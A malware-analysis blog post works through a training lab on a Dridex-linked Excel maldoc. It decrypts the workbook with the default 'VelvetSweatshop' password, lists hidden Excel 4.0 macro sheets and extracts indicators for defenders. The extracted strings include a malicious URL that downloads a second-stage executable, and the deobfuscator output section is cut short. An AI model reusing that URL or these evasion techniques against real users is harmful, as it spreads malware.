[Josh Stroschein](https://github.com/jstrosch) has done some awesome work collecting useful samples of Maldocs in his [Malware Samples Repo](https://github.com/jstrosch/malware-samples), and took the time to write up an exercise that's been uploaded to [CyberDefenders](https://cyberdefenders.org/labs/55) - which is what I'm exploring in this blog post.

While he's already provided a very detailed walkthrough, I've come at this with little experience analysing malicious Excel Documents, and so I thought it'd be worth padding it out with some additional information novices such as myself might find useful if they're new to the game.

Read on for my notes from tackling the 1st Sample which contained an encrypted workbook, and some quick wins for identify C2 strings to help with initial blocking of additional stages.

## Retrieving the files without cloning the whole repo:

The first step is to retrieve the samples, ideally without having to clone the entire malware-samples repo. While git doesn't have the inbuilt functionality to do this, we can achieve the same result by using Apache's Subversion.

You can easily download it with `apt install subversion`

> **NOTE:** For future reference - you'll need to replace _/tree/master_ with _/trunk_ in the github URL, and you can test with `svn ls` prior to downloading the folder using `svn export`

```
root@ubuntu:/home/montana/Documents# svn export https://github.com/jstrosch/malware-samples/trunk/malware_analysis_exercises/2021/February
```

Now that you've got it, move to the directory and deflate it with `unzip samples.zip`, entering the password of "infected" when prompted.

## Sample #1

The first tool we'll use is oledump.py - this is usually a pretty reliable first step to identifying any malicious macros in a workbook:
```
root@ubuntu:/home/montana/Documents/February# oledump.py fb5ed444ddc37d748639f624397cff2a.bin 
  1:       114 '\x01CompObj'
  2:       368 '\x05DocumentSummaryInformation'
  3:       200 '\x05SummaryInformation'
  4:     92329 'Workbook'
```

### Dealing with Encrypted Spreadsheets (msoffcrypto-tool)

As you can see from the above, there's no macros - it could be that the spreadsheet is password protected, which can be checked easily with the msoffcrypto-tool:
```
root@ubuntu:/home/montana/Documents/February# msoffcrypto-tool 
	usage: msoffcrypto-tool [-h] (-p [PASSWORD] | -t) [-v] [infile] [outfile]
	msoffcrypto-tool: error: one of the arguments -p/--password -t/--test is required

root@ubuntu:/home/montana/Documents/February# msoffcrypto-tool fb5ed444ddc37d748639f624397cff2a.bin --test -v
	Version: 4.12.0
	fb5ed444ddc37d748639f624397cff2a.bin: encrypted
```

#### VelvetSweatshop

VelvetSweatshop - it sounds like a cool name for a Threat Group or Malware family, but turns out it's actually a default password used by Excel in the process of decrypting _any_ encrypted document - if that fails, only then will it ask the user for a password to decrypt it. 

This mechanism is used to secure read-only Excel documents, and experienced a resurgence in 2020 with the [spreading of LimeRAT](https://www.mimecast.com/blog/velvetsweatshop-microsoft-excel-spreadsheet-encryption-rises-again-to-deliver-limerat-malware/) using this method.

Fortunately, it's a simple matter of passing the password as a parameter to msoffcrypto-tool to output the decrypted spreadsheet for review:

```
root@ubuntu:/home/montana/Documents/February# msoffcrypto-tool fb5ed444ddc37d748639f624397cff2a.bin -p VelvetSweatshop > decrypted.bin
root@ubuntu:/home/montana/Documents/February# msoffcrypto-tool decrypted.bin --test -v
Version: 4.12.0
decrypted.bin: not encrypted
```

Of course, not all maldocs are going to be encrypted with this password, so where bruteforce is required, Didier has you covered with msoffcrypto-crack.py which can either accept a password list to use, or it'll run with a [default list that has 3546 entries](https://github.com/openwall/john/blob/bleeding-jumbo/run/password.lst) (one of which is VelvetSweatshop, naturally):

```
root@ubuntu:/home/montana/Documents/February# msoffcrypto-crack.py fb5ed444ddc37d748639f624397cff2a.bin -o decrypted.bin
Password found: VelvetSweatshop
```

Unfortunately, checking the decrypted spreadsheet again with oledump.py didn't turn up anything more:

```
root@ubuntu:/home/montana/Documents/February/fsample# oledump.py decrypted.bin 
  1:       114 '\x01CompObj'
  2:       368 '\x05DocumentSummaryInformation'
  3:       200 '\x05SummaryInformation'
  4:     92329 'Workbook'

root@ubuntu:/home/montana/Documents/February/fsample# msoffcrypto-tool decrypted.bin --test -v
Version: 4.12.0
decrypted.bin: not encrypted
```

### Parsing Excel 4.0 Macros (plugin_biff)

It's at this point - having not found any Macros, decrypted the spreadsheet only to have again not found anything, that we can move on to testing our next assumption - what about Excel 4.0 Macros?

Didier Stevens created the plugin_biff plugin to help parse the Binary Interchange File Format (BIFF) structures used in Excel Spreadsheets, which we can invoke with the `-p` argument:

```
root@ubuntu:/home/montana/Documents/February/fsample# oledump.py decrypted.bin -p plugin_biff
  1:       114 '\x01CompObj'
  2:       368 '\x05DocumentSummaryInformation'
  3:       200 '\x05SummaryInformation'
  4:     92329 'Workbook'
               Plugin: BIFF plugin 
                 0809     16 BOF : Beginning of File - BIFF8 workbook 0x1fa9 1997

                 00da      2 BOOKBOOL : Workbook Option Flag

```

The initial output isn't very useful, so let's take a shortcut, listing all Excel 4.0 Macros that exist in the spreadsheet:

```
root@ubuntu:/home/montana/Documents/February/fsample# oledump.py decrypted.bin -p plugin_biff --pluginoptions -x | less

  1:       114 '\x01CompObj'
  2:       368 '\x05DocumentSummaryInformation'
  3:       200 '\x05SummaryInformation'
  4:     92329 'Workbook'
               Plugin: BIFF plugin 
                 '0085     25 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - \x00SOCWNEScLLxkLhtJ'

                 '0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - \x00Macro'
                 '0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - \x00Macro'

                 '0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - \x00Macro'

                 '0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - \x00Sheet'
                 '0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - \x00Sheet'
                 '0018     23 LABEL : Cell Value, String Constant - built-in-name 1 Auto_Open len=7 ptgRef3d \x00SOCWNEScLLxkLhtJ!R1275C1 '
```

When responding to an incident where a user has either reported or been identified to have executed malicious embedded macros - time is of the essence to blocking any C2 infrastructure to prevent further infections on the network, and the retrieval of the second stage.

To that end - a lazy but pretty effective way to look for this is to guess that it'd use HTTP(S) to fetch the 2nd stage:

```
root@ubuntu:/home/montana/Documents/February/fsample# oledump.py decrypted.bin -p plugin_biff --pluginoptions "-f http" 
  1:       114 '\x01CompObj'
  2:       368 '\x05DocumentSummaryInformation'
  3:       200 '\x05SummaryInformation'
  4:     92329 'Workbook'
               Plugin: BIFF plugin 
                 "0207     56 STRING : String Value of a Formula - b'http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exe'"
                 "0207     32 STRING : String Value of a Formula - b'http://rilaer.com/IfAmGZIJjbw'"
                 "0207     56 STRING : String Value of a Formula - b'http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exe'"
```

 And voila. Alternatively you could instruct the plugin to dump all strings found in the BIFF structure before passing it to egrep to search for possible IP Addresses - this didn't turn up any results in this case:

```
root@ubuntu:/home/montana/Documents/February/fsample# oledump.py decrypted.bin -p plugin_biff --pluginoptions -s | egrep "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"| less
```

### Deobfuscating XLM Macros (xlmdeobfuscator)

Xlmdeobfuscator is another very cool tool that steps through the macros to reverse what it'll do when executed - in this case it makes light work of what we did with oledump - identifying the 2nd stage download URL, and directory location it's placed in before being executed:

```
root@ubuntu:/home/montana/Documents/February/fsample# xlmdeobfuscator -f decrypted.bin 
pywin32 is not installed (only is required if you want to use MS Excel)

### Attribution

Attribution of maldocs and malware is important to understanding the Organisation's Threat Landscape in terms of:
1. How attacked the organisation or specific work areas like Finance are - this can help prioritise mitigations like blocking non-signed macros, or additional Phishing awareness training;
2. The likely subsequent TTPs the actor would've used which we could build detections for as a future 2nd layer of defence;
3. What the attacker's goals might have been and the potential impact if they succeeded - this is valuable information to justify the ongoing funding for an Organisation's Cyber Security workforce, and moreover for C-Suites to demonstrate to a Board or Shareholders why they needed XYZ dollars to update their EDR solution or additional funding to ingest more telemetry into the SIEM.

Attribution of maldocs and malware are important steps that - while often not straightforward to do for those that aren't specialised Malware Analysts, can still be attempted at a high-level by correlating IOCs with Open Source reporting. 

A common first check is VirusTotal - as you can see, it was first flagged on the 28th April by six AV engines. Not bad, but the generic "Malware" tag isn't very helpful if you wanted to know the potential impact of this sample having executed on your network. 

![virustotal](https://opalsec.github.io/assets/images/xlm_macros_1/virustotal.png)

Running the C2 domain against Abuse.ch - we find that not only was it flagged as Dridex, but it was identified nearly _four weeks prior_ to the first VirusTotal hit:

![abusech_search](https://opalsec.github.io/assets/images/xlm_macros_1/abusech_search.png)

Clicking through on the Malware URL also shows a lot more information like the detection rate across a range of protective services (e.g. Cloudflare and Google's Safe Browsing) and provides the SHA-256 hash for the downloaded payload for further analysis:

![abusech_details](https://opalsec.github.io/assets/images/xlm_macros_1/abusech_details.png)

With regards to points 2 & 3 I made above - this information helps us extrapolate some very valuable additional points:
1. That Dridex could've led to the WastedLocker Ransomware - this is run by EvilCorp who are on a [US Sanctions list](https://home.treasury.gov/news/press-releases/sm845)
	- This means that US Companies could face repercussions for paying the ransom - making it infeasible as a recovery option (when's the last time you tested restoring from backups?)
1. WastedLocker operators [have been observed](https://unit42.paloaltonetworks.com/wastedlocker/) to use WMI and PsExec to move laterally and elevate privileges, before performing standard Ransomware activities such as deleting shadow copies to prevent attempts to restore assets from previous states.
	- We can build detections based on this as an additional layer of defence, where email filtering; execution policies, and Phishing Reporting mechanisms have failed.
